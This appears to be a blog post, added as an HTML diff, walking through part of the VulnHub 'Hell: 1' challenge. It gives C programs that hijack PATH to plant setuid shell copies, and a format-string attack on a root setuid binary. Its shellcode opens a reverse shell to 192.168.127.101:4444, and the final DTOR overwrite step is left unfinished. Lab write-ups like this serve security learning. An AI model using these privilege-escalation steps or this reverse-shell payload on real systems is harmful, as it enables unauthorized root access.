@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Hell: 1 - Part 2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-07-15">July 15, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/hell">hell</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Hell: 1 - Part 2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h2 id="bazza:b7fe5a88214a93180782efcb19cdbc62">Bazza</h2>
+
+<p>With this private key, I was able to SSH in as another user, Bazza.  Within his home directory are two binary files with some interesting permissions.</p>
+
+<pre><code class="language-text">-r-xr-sr-x 1 oj   developers 6239 Jul  6 18:39 part1
+-r-sr-xr-x 1 oj   oj         5312 Jul  6 18:34 part2
+
+bazza@hell:~$ ./part1
+Checking integrity of part2... Done!!
+ 
+Checking integrity of calling target... Done!!
+ 
+Binary and target confirmed.
+ 
+Can't touch this *nah na na na na naaaaaaaa nah*
+uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+
+bazza@hell:~$ ./part2
+Error! 1004 ID detected ... you're not allowed to run this, please use part 1!
+</code></pre>
+
+<p>These binaries are readable, so can be run through strings.</p>
+
+<pre><code class="language-text">bazza@hell:~$ strings part1
+[...snip...]
+900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
+1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
+[...snip...]
+sha256sum /home/bazza/part2
+sha256sum /usr/bin/id
+</code></pre>
+
+<p>There are hardcoded sha256 sums which are compared with the output of <code>sha256sum</code>.  Fortunately the <code>sha256sum</code> path is not hardcoded, meaning it relies on the environmental path variables.  This can be abused as previously, to fool these binaries to execute arbitary code of our own making.</p>
+
+<p><code>Part1</code> has the SUID bit set on the group (developers); <code>Part2</code> checks the EGID of the user running it and has the SUID bit set on owner (oj).</p>
+
+<pre><code class="language-c">sha256sum.c
+ 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+ 
+int main()
+{
+        system(&quot;/bin/cp /bin/sh /tmp/sh&quot;);
+        system(&quot;/bin/chmod g+s /tmp/sh&quot;);
+}
+</code></pre>
+
+<pre><code class="language-text">bazza@hell:~$ ./part1
+[...snip...]
+bazza@hell:~$ /tmp/sh
+$ id
+uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
+</code></pre>
+
+<pre><code class="language-c">id.c
+ 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+ 
+int main()
+{
+        system(&quot;/bin/cp /bin/sh /tmp/oj&quot;);
+        system(&quot;/bin/chmod u+s /tmp/oj&quot;);
+}
+</code></pre>
+
+<pre><code class="language-text">$ ./part2
+$ /tmp/oj
+$ whoami
+oj
+</code></pre>
+
+<p>Now I am OJ (I wish I was as good as OJ)  :)</p>
+
+<h2 id="thecolonial:b7fe5a88214a93180782efcb19cdbc62">TheColonial</h2>
+
+<p>This is the final hurdle, but it&rsquo;s a doosy.  There is a binary, <code>echo</code> in his home directory, owned by root and has the SUID bit set.</p>
+
+<pre><code class="language-text">-r-sr-xr-x 1 root root 592549 Jul  5 21:12 echo
+</code></pre>
+
+<p>It takes user input and echo&rsquo;s it back - simple.  Playing with the input, I found that it has a string format vulnerability, which will ultimately allow hijack of the application flow.</p>
+
+<pre><code class="language-text">oj@hell:~$ ./echo AAAA%p
+AAAA0x80488c0
+</code></pre>
+
+<p>First, I need to check for protections.</p>
+
+<pre><code class="language-text">oj@hell:~$ ./checksec.sh --file echo 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echo
+
+oj@hell:~$ cat /proc/sys/kernel/randomize_va_space 
+0
+</code></pre>
+
+<p>It was a bit of a pain to find my string on the stack, but I eventually found it to be at 116th position.</p>
+
+<pre><code class="language-text">oj@hell:~$ ./echo `printf 'AAAA%%116$p'`
+AAAA0x41414141
+</code></pre>
+
+<p>Hopefully, I will be able to overwrite the address for printf with the location of my own shellcode.</p>
+
+<pre><code class="language-text">$ export SHELLCODE=$(python -c 'print &quot;\x90&quot; * 500 + &quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x7f\x65\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80&quot;')
+
+$ ./addr SHELLCODE
+0xbffffdbd
+</code></pre>
+
+<pre><code class="language-c">addr.c
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char *argv[])
+{
+   if(!argv[1])
+      exit(1);
+   printf(&quot;%#x\n&quot;, getenv(argv[1]));
+   return 0;
+}
+</code></pre>
+
+<p>The binary is statically linked, so we can&rsquo;t do things such as <code>p system</code> in <code>gdb</code> or <code>objdump -R</code> to obtain the GOT.  We shall have to overwrite the destructor (DTOR) instead.</p>
+
+<pre><code class="language-text">oj@hell:~$ nm echo | grep -i dtor
+080481e0 t __do_global_dtors_aux
+080c9614 t __do_global_dtors_aux_fini_array_entry
+</code></pre>
+
+<blockquote>
+<p>to be completed</p>
+</blockquote>
+
+<h2 id="flag:b7fe5a88214a93180782efcb19cdbc62">Flag</h2>
+
+<pre><code class="language-text">Congratulations of beating Hell. 
+ 
+I hope you enjoyed it and there weren't to many trolls in here for you. 
+ 
+Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
+ 
+Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
+</code></pre>
+
+<h2 id="shout-outs:b7fe5a88214a93180782efcb19cdbc62">Shout-outs</h2>
+
+<p>This was a really tough challenge, and I wouldn&rsquo;t have been able to complete it without the collaboration of the other guys in #VulnHub.  Special thanks go to:</p>
+
+<ul>
+<li>recrudesce - it was great fun working alongside you for most of the way;</li>
+<li>barrebas - for your general pointers and guidance, and;</li>
+<li>c0ne - for graciously donating your python split code.</li>
+</ul>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
